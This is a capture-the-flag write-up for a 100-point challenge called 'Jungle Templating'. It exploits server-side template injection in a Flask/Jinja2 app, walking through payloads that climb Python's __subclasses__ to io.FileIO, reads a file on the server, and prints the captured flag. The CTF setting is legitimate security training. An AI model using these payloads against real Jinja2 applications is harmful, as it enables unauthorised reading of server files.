# Jungle Templating 
### 100 Points

## Information


Challenge link : http://206.189.236.145:5000/

N.B: There is no need to bruteforce anything.

Download Links:
 1. <a href="https://drive.google.com/drive/folders/1MMs6CiIiBnEYUCaJyMGQqijCeW4oVdZj?usp=sharing">Link 1 </a>
 2. <a href="https://drive.google.com/drive/folders/1XhmpIClPijz5P4z81gNxjyyCHNS1sAk5?usp=sharing">Link 2 </a>
 3. <a href="https://drive.google.com/drive/folders/1br7Y_fZHuuqXZAlVMh_lg-qM1TEVeG60?usp=sharing">Link 3 </a>

Flag Format : BDSEC{fl4g_h3r3}


## Steps done

 1. We visited the URL, and it allows the user tu put a text in an input and the text is displayed on the HTML
 2. We opened the code and saw that the application was developed using flask and Jinja2 as Template engine. It consist in two files one is the python file with the endpoints and the HTML and the other is a file called `flag`. On the Python file we oberserved that the input was not sanitized and it's displayed directly on the HTML.
 3. We followed this <a href="https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/">Link</a> and first we sent on the input name this HTML injection `{{'abc'.__class__}}` and the response was: `str`
 4. We sent this request `'abc'.__class__.__base__` and the response was: `object`
 5. Now we look at all the subclasses of object with the payload `{{'abc'.__class__.__base__.__subclasses__()}}`. We received in the response an array with all the subclasses
 6. We looked for `_io._IOBase` class, we found it at index [92] of the `__subclasses__`. We sent the next value in the input `{{'abc'.__class__.__base__.__subclasses__()[92]}}` and we get the response `_io.IOBase`as expected
 7. We needed to found the `_io._RawIoBase` subclass, to do it we repeated the same process on 5 and 6, and we get it at index [0]
 8. We checked sending a request with the payload ``{{'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0]}}`` and we received `io.FileIO`
 9. Finally, we used the above class to construct a file object and read the `flag` file with the next payload `{{'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('flag').read()}}`
 10. We got the response `BDSEC{Y3Y_7H1515_7H3_F146}`

 ## Aditional Note

For any reason we was not able to access to the URL from Argentina, and we used Postman Web, (With the web agent of course) to did the requests